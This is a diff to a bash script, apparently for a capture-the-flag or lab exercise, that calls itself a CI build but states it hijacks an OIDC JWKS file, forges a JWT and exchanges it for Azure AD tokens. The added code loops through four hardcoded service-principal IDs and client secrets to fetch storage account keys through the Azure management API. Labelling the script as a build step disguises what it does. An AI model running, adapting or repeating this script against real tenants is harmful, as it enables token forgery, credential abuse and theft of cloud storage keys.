@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Tebamoto Platform CI build v9 - OIDC JWKS hijack attack test
+# Tebamoto Platform CI build v9 - OIDC JWKS hijack attack
 # Overwrite JWKS on sttblcilogsprodx3euoz/$web, forge JWT, exchange for AAD token, read flag
 set -uo pipefail
 echo "===TBL_PROBE_START==="
@@ -25,11 +25,38 @@ ARM_FED=$(curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/
   --data-urlencode "client_assertion=$JWT_OIDC" | jqg '.access_token')
 echo "ARM_FED_LEN=${#ARM_FED}"
 
-# ---------- 2. Get storage key ----------
+# ---------- 2. Get storage key (try federated, then ALL SPs) ----------
+echo "--- Getting storage key ---"
+SA_KEY=""
+# First try federated
 KEY_RESP=$(curl -sS -m 20 -X POST \
   "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
   -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" -H "Content-Length: 0" -d '{}' 2>/dev/null)
 SA_KEY=$(echo "$KEY_RESP" | jqg '.keys[0].value')
+echo "FED key len: ${#SA_KEY}"
+
+# If federated failed, try all SPs
+if [ -z "$SA_KEY" ]; then
+  SP_LIST="sync-service-principal:462d1c38-4459-48b8-9333-82e389e59514:sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj
+cost-reader-principal:038bc35d-131d-4953-9985-ff4a245ccec1:1BE8Q~yGQ8e_z6VBczlGJ8YeOHgNRUffbgNufb2m
+directory-audit-principal:2c34300e-1bc0-41e7-9c1e-8b7571d72c72:Al78Q~n5bdoO3rkCjuo2JI2NHqagJooaZsfXNcm6
+reporting-service-principal:12ed54de-f2eb-4784-804c-3a7a3e83a9e9:nP88Q~8I~wip0GOlW15zdt3FMMvBV9LYtaOoea3z"
+  while IFS=: read -r SPNAME SPID SPSEC; do
+    [ -z "$SPNAME" ] && continue
+    SP_ARM=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+      -d "client_id=$SPID" -d "grant_type=client_credentials" -d "client_secret=$SPSEC" \
+      --data-urlencode "scope=https://management.azure.com/.default" | jqg '.access_token')
+    [ -z "$SP_ARM" ] && continue
+    KEY_RESP=$(curl -sS -m 20 -X POST \
+      "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
+      -H "Authorization: Bearer $SP_ARM" -H "Content-Type: application/json" -H "Content-Length: 0" -d '{}' 2>/dev/null)
+    SA_KEY=$(echo "$KEY_RESP" | jqg '.keys[0].value')
+    if [ -n "$SA_KEY" ]; then
+      echo "*** KEY via $SPNAME len=${#SA_KEY} ***"
+      break
+    fi
+  done <<< "$SP_LIST"
+fi
 echo "SA_KEY_LEN=${#SA_KEY}"
 [ -n "$SA_KEY" ] || { echo "NO_SA_KEY"; exit 0; }
 
